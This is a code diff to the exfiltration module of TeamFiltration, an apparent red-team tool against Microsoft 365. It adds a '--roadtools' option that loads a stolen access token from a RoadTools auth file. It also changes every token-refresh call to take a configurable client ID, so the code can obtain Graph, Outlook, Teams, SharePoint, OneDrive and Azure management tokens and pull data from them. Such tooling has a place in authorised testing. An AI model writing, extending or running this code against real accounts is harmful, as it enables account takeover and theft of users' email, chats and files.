@@ -382,6 +382,45 @@ namespace TeamFiltration.Modules
                 await PrepareExfilCreds(username, password, exfilOptions);
 
             }
+            else if (args.Contains("--roadtools"))
+            {
+                string roadAuthFile = args.GetValue("--roadtools");
+
+                if (File.Exists(roadAuthFile))
+                {
+                    string rawAuthFile = File.ReadAllText(roadAuthFile);
+                    try
+                    {
+
+
+                        RoadToolsAuth roadToolsAuth = JsonConvert.DeserializeObject<RoadToolsAuth>(rawAuthFile);
+                        JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();
+
+                        JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(roadToolsAuth.accessToken);
+                        string userName = Helpers.Generic.GetUsername(jwtSecToken.RawData);
+                        Console.WriteLine($"[+] Exfiltrating data from user {userName}");
+                        await RefreshExfilAccountAsync(
+                          _globalProperties.OutPutPath,
+                          (BearerTokenResp)roadToolsAuth,
+                          exfilOptions,
+                          _msolHandler,
+                          clientId: roadToolsAuth._clientId);
+                    }
+                    catch (JsonException jsonex)
+                    {
+
+                        Console.WriteLine($"[!] Failed to parse RoadTools auth JSON file, is the format correct?");
+                        Console.WriteLine($"{jsonex.Message}");
+                    }
+                    catch (Exception ex)
+                    {
+
+                        Console.WriteLine($"[!] Failed to exfiltrate using RoadTools auth file");
+                        Console.WriteLine($"{ex.Message}");
+                    }
+                }
+
+            }
             else if (args.Contains("--tokens"))
             {
                 //JwtTokenHandler
@@ -886,7 +925,7 @@ namespace TeamFiltration.Modules
             return;
 
         }
-        private static async Task RefreshExfilAccountAsync(string outpath, BearerTokenResp inputTokenData, ExifilOptions exifilOptions, MSOLHandler msolHandler)
+        private static async Task RefreshExfilAccountAsync(string outpath, BearerTokenResp inputTokenData, ExifilOptions exifilOptions, MSOLHandler msolHandler, string clientId = "1fec8e78-bce4-4aaf-ab1b-5451cc387264")
         {
             //Extract the username from the initial JWT token
             string username = Helpers.Generic.GetUsername(inputTokenData.access_token);
@@ -908,10 +947,10 @@ namespace TeamFiltration.Modules
             {
 
                 if (adGraphToken.bearerToken?.access_token == null)
-                    adGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.windows.net");
+                    adGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.windows.net", clientId: clientId);
 
                 if (msGraphToken.bearerToken?.access_token == null)
-                    msGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com");
+                    msGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com", clientId: clientId);
 
                 if (msGraphToken.bearerToken?.access_token != null)
                     await MsGraphExfilAsync(msGraphToken.bearerToken, baseUserOutPath);
@@ -926,7 +965,7 @@ namespace TeamFiltration.Modules
             {
                 //Get the tokens neede if we don't already have them
                 if (outlookToken.bearerToken?.access_token == null)
-                    outlookToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://outlook.office365.com");
+                    outlookToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://outlook.office365.com", clientId: clientId);
 
                 //Did we get them, if so let's exfil!
                 if (outlookToken.bearerToken?.access_token != null)
@@ -941,7 +980,7 @@ namespace TeamFiltration.Modules
 
                 //Check if we have/can get an teams token
                 if (teamsToken.bearerToken?.access_token == null)
-                    teamsToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://api.spaces.skype.com");
+                    teamsToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://api.spaces.skype.com", clientId: clientId);
 
                 //Do we have a teams token?
                 if (teamsToken.bearerToken != null)
@@ -961,11 +1000,10 @@ namespace TeamFiltration.Modules
 
                         //Get the tokens neede if we don't already have them
                         if (companySharePointToken.bearerToken?.access_token == null)
-                            companySharePointToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), sharePointInfo.personalRootFolderUrl.Replace("-my", ""));
-
+                            companySharePointToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), sharePointInfo.personalRootFolderUrl.Replace("-my", ""), clientId: clientId);
                         //Get the tokens neede if we don't already have them
                         if (personalOneDriveToken.bearerToken?.access_token == null)
-                            personalOneDriveToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), sharePointInfo.personalRootFolderUrl);
+                            personalOneDriveToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), sharePointInfo.personalRootFolderUrl, clientId: clientId);
 
                         //Did we get them, if so let's exfil!
                         if (teamsToken.bearerToken?.access_token != null && personalOneDriveToken.bearerToken?.access_token != null)
@@ -981,27 +1019,33 @@ namespace TeamFiltration.Modules
             if (exifilOptions.Tokens)
             {
                 if (msGraphToken.bearerToken?.access_token == null)
-                    msGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com");
+                    msGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com", clientId: clientId);
 
                 //We need either a teams token or Graph API token in order to get the SharePoint URL
                 if (msGraphToken.bearerToken != null)
                 {
                     var oneDriveHandler = new OneDriveHandler(msGraphToken.bearerToken, username, _globalProperties, _databaseHandler);
 
+                    //Pretty sure this can be done without Auth
                     SharePointSite siteRoot = await oneDriveHandler.GetSiteRoot();
 
-                    companySharePointToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), siteRoot.WebUrl.Replace("-my", ""));
-                    personalOneDriveToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), siteRoot.WebUrl);
+                    if (siteRoot != null)
+                    {
+
+
+                        companySharePointToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), siteRoot.WebUrl.Replace("-my", ""), clientId: clientId);
+                        personalOneDriveToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), siteRoot.WebUrl, clientId: clientId);
+                    }
                 }
 
 
-                outlookToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://outlook.office365.com");
+                outlookToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://outlook.office365.com", clientId: clientId);
 
-                azurePSToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://management.core.windows.net/");
+                azurePSToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://management.core.windows.net/", clientId: clientId);
 
-                msGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com");
+                msGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com", clientId: clientId);
 
-                adGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.windows.net");
+                adGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.windows.net", clientId: clientId);
 
 
                 var bearerTokensOutPath = Path.Combine(baseUserOutPath, @"Tokens");
@@ -1026,7 +1070,7 @@ namespace TeamFiltration.Modules
 
 
                 if (msGraphToken.bearerToken?.access_token == null)
-                    msGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com");
+                    msGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com", clientId: clientId);
 
                 //We need either a teams token or Graph API token in order to get the SharePoint URL
                 if (msGraphToken.bearerToken != null)
@@ -1038,10 +1082,10 @@ namespace TeamFiltration.Modules
 
                     //Get the tokens neede if we don't already have them
                     if (companySharePointToken.bearerToken?.access_token == null)
-                        companySharePointToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), siteRoot.WebUrl.Replace("-my", ""));
+                        companySharePointToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), siteRoot.WebUrl.Replace("-my", ""), clientId: clientId);
 
                     if (personalOneDriveToken.bearerToken?.access_token == null)
-                        personalOneDriveToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), siteRoot.WebUrl);
+                        personalOneDriveToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), siteRoot.WebUrl, clientId: clientId);
 
 
                     //Did we get them, if so let's exfil!
